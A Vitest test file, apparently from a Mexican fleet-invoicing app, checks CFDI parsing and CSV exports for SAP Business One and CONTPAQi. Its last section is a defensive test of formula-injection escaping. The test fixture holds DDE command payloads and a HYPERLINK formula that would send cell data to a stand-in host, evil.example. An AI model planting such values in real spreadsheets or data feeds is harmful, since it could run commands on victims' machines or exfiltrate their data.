import { describe, it, expect } from 'vitest';
import {
  leerDescripcionPrimerConcepto, compararReceptor, cfdiIngresable, validarFotoParaIngreso,
  aFilaExportProveedor, aFilaSapB1, aFilaContpaqi, type FacturaProveedor,
} from './proveedores';
import { toCsv } from './export';

// Solo el motor PURO: ingesta/decisión son el patrón claim de la base
// (unique + eq estado, verificaciones 66 y 86); aquí se fijan los contratos
// que romperían al cliente sin hacer ruido.

describe('leerDescripcionPrimerConcepto', () => {
  it('lee el primer Concepto, con y sin prefijo cfdi:', () => {
    expect(leerDescripcionPrimerConcepto('<cfdi:Concepto Descripcion="CAMBIO DE LLANTA 22.5" Importe="2300"/>'))
      .toBe('CAMBIO DE LLANTA 22.5');
    expect(leerDescripcionPrimerConcepto('<Concepto Importe="1" Descripcion="SERVICIO DE GRUA"/>'))
      .toBe('SERVICIO DE GRUA');
  });

  it('decodifica las entidades XML básicas', () => {
    expect(leerDescripcionPrimerConcepto('<cfdi:Concepto Descripcion="REFACCI&#211;N &amp; MANO DE OBRA"'.replace('&#211;', 'Ó') + '/>'))
      .toBe('REFACCIÓN & MANO DE OBRA');
  });

  it('sin Descripcion devuelve null — no se inventa el concepto', () => {
    expect(leerDescripcionPrimerConcepto('<cfdi:Concepto Importe="100"/>')).toBeNull();
    expect(leerDescripcionPrimerConcepto('<cfdi:Concepto Descripcion=""/>')).toBeNull();
  });
});

describe('compararReceptor — la bandera que no adivina', () => {
  it('compara sin importar caja ni espacios', () => {
    expect(compararReceptor(' aaa010101ab1 ', 'AAA010101AB1')).toBe(true);
    expect(compararReceptor('BBB010101AB1', 'AAA010101AB1')).toBe(false);
  });

  it('sin RFC de la flota (o del CFDI) devuelve null, nunca false', () => {
    expect(compararReceptor('AAA010101AB1', null)).toBeNull();
    expect(compararReceptor(null, 'AAA010101AB1')).toBeNull();
    expect(compararReceptor(undefined, '')).toBeNull();
  });
});

describe('cfdiIngresable — la puerta de la vía XML', () => {
  it('con UUID y total entra; sin cualquiera de los dos, no', () => {
    expect(cfdiIngresable({ uuid: 'AAAA-BBBB', total: 100 })).toBe(true);
    expect(cfdiIngresable({ uuid: undefined, total: 100 })).toBe(false);
    expect(cfdiIngresable({ uuid: 'AAAA-BBBB', total: undefined })).toBe(false);
  });
});

describe('validarFotoParaIngreso — las tres puertas de la vía de foto', () => {
  it('ilegible: el modelo dijo que no pudo leer, y eso manda', () => {
    expect(validarFotoParaIngreso({ cfdiUuid: 'U-1', monto: 100 }, false))
      .toEqual({ ok: false, motivo: 'ilegible' });
  });

  it('sin folio fiscal (QR) no hay llave de dedup: se rechaza, no se inventa', () => {
    expect(validarFotoParaIngreso({ cfdiUuid: undefined, monto: 100 }, true))
      .toEqual({ ok: false, motivo: 'sin_uuid' });
  });

  it('un total en cero leído por OCR no es una cifra, es la ausencia de una', () => {
    expect(validarFotoParaIngreso({ cfdiUuid: 'U-1', monto: 0 }, true))
      .toEqual({ ok: false, motivo: 'sin_total' });
  });

  it('feliz: legible, con UUID y con total', () => {
    expect(validarFotoParaIngreso({ cfdiUuid: 'U-1', monto: 2668 }, true)).toEqual({ ok: true });
  });
});

const FACTURA: FacturaProveedor = {
  id: 'f1', cfdiUuid: 'AAAA-BBBB', emisorRfc: 'TAL010101AB1', emisorNombre: null,
  receptorRfc: 'FLO010101AB1', receptorEsFlota: true, fecha: '2026-08-10',
  subTotal: 2300, iva: 368, total: 2668, descripcion: 'CAMBIO DE LLANTA',
  conceptos: 2, estado: 'aprobada', decididoPor: 'ana@flota.mx',
  decididoEn: '2026-08-14T17:00:00Z', creadoEn: '2026-08-14T16:00:00Z',
  origen: 'correo', ocrConfianza: null, estadoSat: 'vigente', exportadaEn: null,
  requiereRevision: false, revisionMotivo: null, fuenteDatos: 'xml', tienePdf: false, entregaId: null, entregadaEn: null,
};

describe('aFilaExportProveedor — el contrato del layout genérico', () => {
  it('las columnas son EXACTAMENTE estas — renombrar una rompe el import del cliente', () => {
    expect(Object.keys(aFilaExportProveedor(FACTURA))).toEqual([
      'fecha', 'uuid', 'rfc_emisor', 'rfc_receptor', 'descripcion', 'conceptos',
      'subtotal', 'iva', 'total', 'aprobada_por', 'aprobada_en',
    ]);
  });

  it('los nulos salen como celda vacía, nunca como "null"', () => {
    const fila = aFilaExportProveedor({ ...FACTURA, fecha: null, subTotal: null, iva: null, descripcion: null });
    expect(fila.fecha).toBe('');
    expect(fila.subtotal).toBe('');
    expect(fila.iva).toBe('');
    expect(fila.descripcion).toBe('');
    expect(fila.total).toBe(2668);
  });
});

describe('aFilaSapB1 — el layout de importación de SAP Business One', () => {
  it('las columnas son EXACTAMENTE los campos del import estándar (OPCH + línea)', () => {
    expect(Object.keys(aFilaSapB1(FACTURA))).toEqual([
      'DocDate', 'DocDueDate', 'CardCode', 'CardName', 'FederalTaxID', 'NumAtCard',
      'Comments', 'DocTotal', 'ItemDescription', 'LineTotal', 'TaxCode',
    ]);
  });

  it('DocDate va en AAAAMMDD, el formato del DTW', () => {
    expect(aFilaSapB1(FACTURA).DocDate).toBe('20260810');
    expect(aFilaSapB1({ ...FACTURA, fecha: null }).DocDate).toBe('');
  });

  it('lo que vive en el SAP del CLIENTE sale VACÍO — CardCode, TaxCode y DocDueDate no se adivinan', () => {
    const fila = aFilaSapB1(FACTURA);
    expect(fila.CardCode).toBe('');
    expect(fila.TaxCode).toBe('');
    expect(fila.DocDueDate).toBe('');
  });

  it('el UUID viaja como NumAtCard (la referencia del proveedor) y el RFC como FederalTaxID', () => {
    const fila = aFilaSapB1(FACTURA);
    expect(fila.NumAtCard).toBe('AAAA-BBBB');
    expect(fila.FederalTaxID).toBe('TAL010101AB1');
    expect(fila.DocTotal).toBe(2668);
    expect(fila.LineTotal).toBe(2300);
  });
});

describe('aFilaContpaqi — la variante simple en español', () => {
  it('las columnas son EXACTAMENTE estas', () => {
    expect(Object.keys(aFilaContpaqi(FACTURA))).toEqual([
      'fecha', 'rfc_proveedor', 'nombre_proveedor', 'uuid_fiscal', 'concepto',
      'subtotal', 'iva', 'total',
    ]);
  });

  it('la fecha va dd/mm/aaaa, como captura el contador; sin fecha, celda vacía', () => {
    expect(aFilaContpaqi(FACTURA).fecha).toBe('10/08/2026');
    expect(aFilaContpaqi({ ...FACTURA, fecha: null }).fecha).toBe('');
  });

  it('los nulos salen como celda vacía, nunca como "null"', () => {
    const fila = aFilaContpaqi({ ...FACTURA, subTotal: null, iva: null, descripcion: null });
    expect(fila.subtotal).toBe('');
    expect(fila.iva).toBe('');
    expect(fila.concepto).toBe('');
    expect(fila.total).toBe(2668);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// AUDITORÍA ADVERSARIAL ALTO #1 — INYECCIÓN DE FÓRMULAS CSV (CWE-1236), de
// punta a punta: la `descripcion` sale de `leerDescripcionPrimerConcepto`
// (atributo libre de un CFDI que llega por correo NO autenticado) y el RFC del
// emisor/receptor sale igual de libre del XML. Ninguno valida un patrón al
// extraerse (proveedores.ts:75-83) — la protección tiene que sobrevivir hasta
// el CSV que de verdad abre Excel, en los TRES layouts.
// ═══════════════════════════════════════════════════════════════════════════
describe('Export de facturas de proveedor — inyección de fórmulas CSV, de punta a punta', () => {
  // El emisor del CFDI (un proveedor hostil, o un correo suplantado contra el buzón) manda un
  // Concepto/@Descripcion y un Emisor/@Rfc que, al abrirse en Excel, se leerían como fórmula.
  const FACTURA_HOSTIL: FacturaProveedor = {
    ...FACTURA,
    emisorRfc: '=cmd|\'/c calc\'!A1',
    receptorRfc: '+2+5+cmd|\' /C calc\'!A0',
    descripcion: '=HYPERLINK("http://evil.example/robar?x="&A1,"ver factura")',
  };

  it('layout genérico: descripcion, rfc_emisor y rfc_receptor salen ESCAPADOS en el CSV', () => {
    const csv = toCsv([aFilaExportProveedor(FACTURA_HOSTIL)]);
    const fila = csv.trimEnd().split('\n')[1];
    expect(fila).not.toMatch(/(^|,)=HYPERLINK/);
    expect(fila).not.toMatch(/(^|,)=cmd\|/);
    expect(fila).not.toMatch(/(^|,)\+2\+5/);
    expect(fila).toContain("'=HYPERLINK");
    expect(fila).toContain("'=cmd|");
    expect(fila).toContain("'+2+5");
  });

  it('layout SAP B1 (CardName/FederalTaxID/Comments/ItemDescription): igual de protegido', () => {
    const csv = toCsv([aFilaSapB1(FACTURA_HOSTIL)]);
    const fila = csv.trimEnd().split('\n')[1];
    expect(fila).not.toMatch(/(^|,)=HYPERLINK/);
    expect(fila).not.toMatch(/(^|,)=cmd\|/);
  });

  it('layout CONTPAQi (rfc_proveedor/concepto): igual de protegido', () => {
    const csv = toCsv([aFilaContpaqi(FACTURA_HOSTIL)]);
    const fila = csv.trimEnd().split('\n')[1];
    expect(fila).not.toMatch(/(^|,)=HYPERLINK/);
    expect(fila).not.toMatch(/(^|,)=cmd\|/);
  });

  it('el total (number, jamás libre) nunca se escapa aunque la factura sea hostil', () => {
    const csv = toCsv([aFilaExportProveedor({ ...FACTURA_HOSTIL, total: -500 })]);
    const fila = csv.trimEnd().split('\n')[1];
    expect(fila).toMatch(/(^|,)-500(,|$)/);
  });
});
